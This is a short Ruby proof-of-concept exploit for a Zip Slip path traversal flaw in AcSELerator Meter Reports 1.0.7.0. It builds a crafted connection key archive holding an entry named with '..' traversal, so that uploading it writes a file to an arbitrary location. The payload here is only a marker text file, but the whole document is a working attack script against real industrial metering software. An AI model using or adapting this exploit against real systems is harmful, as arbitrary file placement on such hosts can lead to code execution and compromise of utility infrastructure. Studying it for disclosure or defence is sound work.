#!/usr/bin/env ruby
# AcSELerator Meter Reports 1.0.7.0 can be abused by a "Zip Slip" 
# traversal attack.
# When a specially crafted connection key archive is uploaded, the application
# can be abused to place arbitrary files into arbitrary locations. 

require 'rex'
require 'rex/zip'

zip = Rex::Zip::Archive.new
zip.add_file("manifest.txt")
zip.add_file("connection.key")
zip.add_file("\\..\\SEL-PWND.txt", "mc was here")
zip.save_to("SEL-PWND.ckf")
